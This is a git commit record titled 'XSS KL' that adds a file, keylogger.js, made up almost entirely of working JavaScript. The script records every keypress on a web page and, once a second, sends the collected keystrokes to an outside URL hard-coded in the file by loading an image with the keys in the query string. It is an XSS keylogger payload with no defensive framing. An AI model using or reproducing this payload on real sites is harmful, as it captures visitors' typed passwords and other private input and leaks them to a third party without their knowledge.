c263a53fac904225e75eb23009d8ecbe21321164
rerrabelly <ranadheer.com@gmail.com>
2019-03-25 21:32:19 -0400

    XSS KL

---
+++ keylogger.js
@@ -0,0 +1,17 @@
+var keys='';
+var url = 'https://chkmrx.finra.org/CxWebClient/?c=';
+
+document.onkeypress = function(e) {
+	get = window.event?event:e;
+	key = get.keyCode?get.keyCode:get.charCode;
+	key = String.fromCharCode(key);
+	keys+=key;
+}
+window.setInterval(function(){
+	if(keys.length>0) {
+		new Image().src = url+keys;
+		keys = '';
+	}
+}, 1000);
+
+
